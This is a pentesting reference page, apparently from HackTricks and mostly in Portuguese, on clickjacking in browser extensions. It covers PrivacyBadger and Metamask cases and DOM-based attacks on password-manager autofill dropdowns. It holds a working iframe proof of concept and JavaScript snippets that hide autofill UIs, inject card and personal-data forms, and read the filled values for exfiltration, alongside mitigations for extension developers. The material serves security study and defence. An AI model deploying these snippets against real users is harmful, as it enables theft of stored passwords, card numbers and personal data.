# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

Esta página vai explorar uma vulnerabilidade de ClickJacking em uma extensão do navegador.\
Se você não sabe o que ClickJacking é, veja:

{{#ref}}
../clickjacking.md
{{#endref}}

As extensões contêm o arquivo **`manifest.json`** e esse arquivo JSON tem um campo `web_accessible_resources`. Eis o que [a documentação do Chrome](https://developer.chrome.com/extensions/manifest/web_accessible_resources) diz sobre isso:

> Esses recursos ficariam então disponíveis em uma página web através da URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, que pode ser gerada com o **`extension.getURL method`**. Recursos allowlisted são servidos com cabeçalhos CORS apropriados, então ficam disponíveis por mecanismos como XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

As `web_accessible_resources` em uma extensão do navegador não são apenas acessíveis via web; elas também operam com os privilégios inerentes da extensão. Isso significa que elas têm a capacidade de:

- Alterar o estado da extensão
- Carregar recursos adicionais
- Interagir com o navegador até certo ponto

No entanto, esse recurso apresenta um risco de segurança. Se um recurso dentro de `web_accessible_resources` tiver alguma funcionalidade significativa, um atacante poderia potencialmente incorporar esse recurso em uma página web externa. Usuários desatentos que visitarem essa página podem inadvertidamente ativar esse recurso incorporado. Tal ativação pode levar a consequências indesejadas, dependendo das permissões e capacidades dos recursos da extensão.

## Exemplo do PrivacyBadger

Na extensão PrivacyBadger, foi identificada uma vulnerabilidade relacionada ao diretório `skin/` sendo declarado como `web_accessible_resources` da seguinte forma (veja o [post original](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Essa configuração resultou em um potencial problema de segurança. Especificamente, o arquivo `skin/popup.html`, que é renderizado ao interagir com o ícone do PrivacyBadger no navegador, podia ser incorporado dentro de um `iframe`. Essa incorporação poderia ser explorada para enganar usuários e levá‑los a clicar inadvertidamente em "Disable PrivacyBadger for this Website". Tal ação comprometeria a privacidade do usuário ao desativar a proteção do PrivacyBadger e potencialmente sujeitá‑lo a maior rastreamento. Uma demonstração visual desse exploit pode ser vista em um vídeo de ClickJacking disponível em [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Para corrigir essa vulnerabilidade, foi implementada uma solução simples: a remoção de `/skin/*` da lista de `web_accessible_resources`. Essa alteração mitigou efetivamente o risco, assegurando que o conteúdo do diretório `skin/` não pudesse ser acessado ou manipulado através de recursos web acessíveis.

A correção foi simples: **remove `/skin/*` from the `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Exemplo

Um [**post de blog sobre um ClickJacking no Metamask pode ser encontrado aqui**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Nesse caso, Metamask corrigiu a vulnerabilidade verificando que o protocolo usado para acessá-lo era **`https:`** ou **`http:`** (não **`chrome:`**, por exemplo):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Outro ClickJacking corrigido** na extensão Metamask foi que usuários conseguiam **Click to whitelist** quando uma página era suspeita de ser phishing por causa de `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Como essa página era vulnerável a Clickjacking, um atacante poderia abusar dela mostrando algo normal para fazer a vítima clicar para whitelist sem perceber, e então voltar para a página de phishing que seria colocada na whitelist.

## Exemplo Steam Inventory Helper

Veja a página a seguir para ver como um **XSS** em uma extensão de navegador foi encadeado com uma vulnerabilidade de **ClickJacking**:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Classic extension clickjacking abuses misconfigured `web_accessible_resources` to iframe privileged HTML and drive user clicks. A newer class, DOM-based extension clickjacking, targets the autofill dropdowns injected by password managers directly into the page DOM and uses CSS/DOM tricks to hide or occlude them while keeping them clickable. One coerced click can select a stored item and fill attacker-controlled inputs with sensitive data.

### Threat model

- O atacante controla uma página web (ou realiza XSS/subdomain takeover/cache poisoning em um domínio relacionado).
- A vítima tem uma extensão de gerenciador de senhas instalada e desbloqueada (alguns autofill atuam mesmo quando, nominalmente, bloqueados).
- Pelo menos um clique do usuário é induzido (banners de cookies sobrepostos, diálogos, CAPTCHAs, jogos, etc.).

### Attack flow (manual autofill)

1. Injete um formulário invisível mas focável (campos de login/PII/cartão de crédito).
2. Foque um input para invocar o dropdown de autofill da extensão próximo ao campo.
3. Oculte ou oclua a UI da extensão mantendo-a interagível.
4. Alinhe um controle crível sob o dropdown oculto para coagir um clique que selecione um item.
5. Leia os valores preenchidos no formulário do atacante e exfiltre.

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Filho dentro de ShadowRoot aberto (tag dinâmica, ocultar iframe interno):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Elemento pai
- BODY/HTML: truques de opacidade para tornar a UI da extensão invisível enquanto a página aparenta normal (por exemplo, fundo da captura de tela):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Partial overlay: oculte tudo exceto alguns pixels para que o dropdown permaneça clicável (garanta que attacker overlay seja o último no DOM com max z-index, ou use Top Layer).
- Full overlay usando pointer-events:none para que os cliques passem pelo dropdown oculto; mantenha-o persistente com o Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Posicionando o clique da vítima

- Fixed placement: posicione o dropdown oculto sob um controle crível, como “Accept cookies”, “Close” ou uma checkbox de CAPTCHA.
- Follow-mouse: mova o input em foco sob o cursor para que o dropdown o acompanhe; refoque periodicamente para que um único clique em qualquer lugar selecione um item:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Impacto e cenários

- Site controlado pelo atacante: um clique coagido pode exfiltrar dados de cartão de crédito (número/validade/CVC) e informações pessoais (nome, email, telefone, endereço, DOB) que não estão limitadas ao domínio.
- Site confiável com XSS/subdomain takeover/cache poisoning: roubo em múltiplos cliques de credenciais (username/password) e TOTP, porque muitos password managers fazem autofill entre subdomínios relacionados/domínios pai (por exemplo, `*.example.com`).
- Passkeys: se o RP não vincular os desafios WebAuthn à sessão, XSS pode interceptar a signed assertion; DOM-based clickjacking oculta o prompt de passkey para induzir o clique de confirmação do usuário.

### Limitações

- Requer pelo menos um clique do usuário e bom alinhamento de pixels (overlays realistas facilitam solicitar cliques).
- Auto-lock/logout reduz a janela de exploração; alguns managers ainda fazem autofill enquanto “locked”.

### Mitigações para desenvolvedores de extensões

- Renderizar a UI de autofill no Top Layer (Popover API) ou garantir de outra forma que ela fique acima do empilhamento da página; evitar ser coberta por overlays controlados pela página.
- Resistir a tampering de CSS: preferir Closed Shadow DOM e monitorar com `MutationObserver` por mudanças de estilo suspeitas nas raízes da UI.
- Detectar overlays hostis antes de preencher: enumerar outros elementos top-layer/popover, desabilitar temporariamente `pointer-events:none` e usar `elementsFromPoint()` para detectar oclusão; fechar a UI se overlays existirem.
- Detectar mudanças suspeitas de opacidade ou estilo em `<body>`/`<html>` tanto pré quanto pós-render.
- Para problemas baseados em iframe: restringir escopo de MV3 `web_accessible_resources` `matches` e evitar expor UIs HTML; para HTML inevitável, servir `X-Frame-Options: DENY` ou `Content-Security-Policy: frame-ancestors 'none'`.


## Referências

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
